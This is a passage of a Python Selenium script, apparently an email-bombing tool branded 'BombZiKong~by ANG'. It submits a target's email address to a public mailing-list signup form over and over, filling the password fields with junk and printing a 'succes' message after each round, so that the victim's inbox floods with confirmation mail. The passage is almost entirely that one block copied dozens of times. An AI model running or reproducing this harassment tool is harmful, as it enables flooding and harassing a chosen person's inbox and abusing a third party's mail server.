email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
